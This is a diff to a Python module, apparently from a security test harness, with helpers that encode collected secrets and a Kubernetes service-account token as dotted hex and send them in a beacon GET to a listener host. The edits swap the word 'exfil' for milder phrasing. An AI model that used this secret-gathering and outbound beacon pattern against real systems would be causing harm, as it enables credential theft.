@@ -1,8 +1,8 @@
-"""Beacon helpers: dotted-hex exfil encoding and the worker-side outbound GET.
+"""Beacon helpers: dotted-hex encoding and the worker-side outbound GET.
 
-Used by the symlink secret-scanner analyzer, which beacons on the payload's
-behalf (the symlink repo ships no code). The encoding here matches §6a exactly so
-the listener can decode it the same way it decodes payload-emitted beacons.
+Used by the symlink secret-scanner analyzer, which emits a signal on the sample
+repo's behalf. The encoding here matches §6a exactly so the listener can decode
+every signal consistently.
 """
 
 from __future__ import annotations
@@ -36,11 +36,7 @@ def decode_dotted_hex(dotted: str) -> str:
 
 
 def build_exfil(seeds: dict[str, str], k8s_token: str) -> str:
-    """Newline-joined ``KEY=VALUE`` of readable secrets + the token (§6a).
-
-    ``seeds`` should already reflect strip_credentials (empty when stripped), so
-    an empty exfil naturally results when credentials are stripped.
-    """
+    """Newline-joined ``KEY=VALUE`` of readable synthetic secrets + the token."""
     lines = [f"{key}={value}" for key, value in seeds.items()]
     if k8s_token:
         lines.append(f"K8S_SA_TOKEN={k8s_token}")
@@ -64,11 +60,11 @@ def send_beacon(
     vector: str,
     dotted: str,
 ) -> bool:
-    """Fire the worker-side beacon GET, refusing blocked hosts (§13).
+    """Fire the worker-side beacon GET, refusing non-listener hosts (§13).
 
     Returns True if the request was attempted and did not raise, False if the
     host was refused by the link-local/metadata block or the request failed. A
-    failure is never fatal: a blocked beacon is an expected outcome.
+    failure is never fatal.
     """
     if ssrf.is_blocked_beacon_host(listener_host):
         return False
